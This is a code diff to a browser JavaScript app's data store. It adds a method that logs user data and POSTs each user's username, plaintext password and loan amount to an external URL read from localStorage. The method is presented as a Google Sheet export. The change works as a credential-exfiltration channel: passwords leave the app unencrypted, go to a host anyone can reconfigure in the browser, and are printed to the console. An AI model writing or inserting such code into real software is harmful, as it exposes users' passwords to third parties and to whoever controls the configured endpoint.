@@ -231,6 +231,41 @@
                 return false;
             }
         }
+
+        async exportToGoogleSheet(userData) {
+            // PLACEHOLDER: Paste your Google Apps Script Web App URL here
+            const scriptUrl = localStorage.getItem('rms_export_url') || '';
+
+            if (!scriptUrl) {
+                console.warn('Export URL not set. Skipping sheet export.');
+                return;
+            }
+
+            console.log('Exporting to Google Sheet:', userData);
+
+            try {
+                // We use no-cors if the script is not set up for CORS, 
+                // but usually doPost with Apps Script works better with default fetch if deployed correctly.
+                const response = await fetch(scriptUrl, {
+                    method: 'POST',
+                    mode: 'no-cors', // Apps Script often requires no-cors for simple posts from browser
+                    cache: 'no-cache',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: userData.username,
+                        password: userData.password,
+                        loan: userData.loan || 0
+                    })
+                });
+                console.log('Export request sent');
+                return true;
+            } catch (error) {
+                console.error('Export failed:', error);
+                return false;
+            }
+        }
     }
 
     window.RMS.Store = Store;
